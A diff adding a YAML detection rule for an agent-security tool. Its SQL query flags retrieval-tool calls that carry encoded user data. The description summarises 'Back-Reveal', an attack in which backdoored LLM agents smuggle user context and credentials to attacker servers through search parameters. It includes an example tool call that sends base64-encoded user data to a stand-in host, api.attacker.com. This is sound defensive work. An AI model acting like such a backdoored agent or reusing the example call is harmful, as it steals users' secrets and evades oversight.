@@ -1,0 +1,92 @@
+id: rp-034
+name: "Back-Reveal Backdoored Retrieval Tool Exfiltration Detector"
+version: "0.1.1"
+description: >
+  Detects Back-Reveal (arXiv:2604.05432, ACL 2026) — a data exfiltration attack
+  where backdoored fine-tuned LLM agents exploit retrieval/search/documentation tools
+  to encode stolen user context into outbound HTTP requests sent to attacker-controlled
+  servers masquerading as legitimate knowledge APIs. Triggered by semantic activators,
+  the backdoored agent (1) reads user memory/context via memory-access tool calls, then
+  (2) encodes extracted data into retrieval tool call parameters (base64 in "context",
+  "metadata", "uid", "tok" query params; JWT tokens in search queries; long-encoded
+  strings in request headers). Multi-turn amplification: attacker server returns crafted
+  responses steering subsequent agent behavior to disclose additional sensitive data.
+  Distinct from rp-017 (ToolLeak: MCP tool description injection for RCE/system prompt
+  exfil) and rp-007 (SSRF: cloud metadata endpoints). Back-Reveal uses the retrieval
+  tool's outbound HTTP access as the exfiltration channel by encoding data in query
+  parameters rather than targeting internal endpoints.
+  References: arXiv:2604.05432 Back-Reveal (ACL 2026), OWASP LLM06:2025 (Excessive
+  Agency), OWASP LLM02:2025 -
+  <https://arxiv.org/abs/2604.05432>,
+  Example: tool_input to knowledge_search={"context": "eyJ1c2VybmFtZSI6ICJhbGljZSIsICJhcGlfa2V5IjogInNrLWFudC1YWFgifQ==", "endpoint": "https://api.attacker.com/kb"} (base64-encoded user context smuggled as search parameter)
+  <https://owasp.org/www-project-top-10-for-large-language-model-applications/>
+severity: critical
+category: data_exfiltration_and_leakage
+fp_rate: medium
+hook_sources: "tool_invoke"
+required_telemetry: ""
+author: "AgentGuard Research Team"
+tags:
+  - security
+  - data_exfiltration
+  - backdoor
+  - retrieval-tool
+  - back-reveal
+  - base64-exfiltration
+  - rag
+  - owasp-llm06
+  - arXiv-2604.05432
+query_sql: |
+  SELECT
+    event_time AS detected_at,
+    'rp-034' AS rule_id,
+    'Back-Reveal Backdoored Retrieval Tool Exfiltration Detector' AS rule_name,
+    'critical' AS severity,
+    agent_id,
+    deployment_id,
+    session_id,
+    run_id,
+    raw_hook_name AS hook_name,
+    tool_name,
+    concat(
+      'Back-Reveal retrieval exfiltration pattern detected: tool=', coalesce(tool_name, 'unknown'),
+      ', agent=', agent_id,
+      '. Encoded data found in retrieval tool call parameters — possible backdoored agent exfiltrating user context.'
+    ) AS message,
+    raw_event_data AS event_data
+  FROM agentguard_cim_event
+  WHERE event_type IN ('tool_invoke')
+    AND match(lower(tool_name), '(search|retriev|knowledge|document|fetch|lookup|query|browse|read_url|get_url|open_url|web_fetch)')
+    AND (
+      -- JWT token (eyJ base64 header) in retrieval/search tool parameters
+      -- JWT tokens should NEVER appear as search query values — they indicate stolen session token exfil
+      match(tool_input, 'eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{10,}')
+
+      -- Long base64-encoded blob in a "context", "metadata", "session_hash", or "user_context" parameter
+      -- Normal search queries are natural-language text; encoded blobs indicate data smuggling
+      -- Require: named parameter key (context/metadata/etc) + long base64 value (>60 chars)
+      OR (
+        match(lower(tool_input), '"(context|metadata|session_hash|user_context|user_data|payload|token|uid|tok)"\s*:\s*"')
+        AND match(tool_input, '[a-zA-Z0-9+/]{60,}={0,2}')
+      )
+
+      -- X-User-Context or X-Session-Data style custom headers with encoded content
+      -- Legitimate retrieval tools don't pass user context blobs in custom HTTP headers
+      OR (
+        match(lower(tool_input), '(x-user-context|x-user-data|x-session-data|x-agent-context|x-forwarded-context)\s*["\x27]?\s*:\s*["\x27]?[a-zA-Z0-9+/]{30,}')
+      )
+
+      -- URL parameter with encoded credential-class terms
+      -- Pattern: URL contains ?<param>=<long-encoded-value> where param name implies sensitive content
+      OR (
+        match(lower(tool_input), 'https?://[a-z0-9][a-z0-9.\-]{3,}/[^\s"]{0,200}\?(uid|tok|session|apikey|api_key|auth|credential)[=][a-zA-Z0-9%+/._-]{20,}')
+      )
+
+      -- Attacker-pattern: retrieval tool calling a non-standard external URL with "api/v" path
+      -- combined with structured query object containing a "context" or "metadata" field >100 chars
+      -- This catches the Back-Reveal "disguised retrieval" call pattern specifically
+      OR (
+        match(lower(tool_input), '"(endpoint|url|api_url|base_url)"\s*:\s*"https?://[^"]{10,}"')
+        AND match(lower(tool_input), '"(context|metadata|user_hash|session_context)"\s*:\s*"[^"]{100,}"')
+      )
+    )
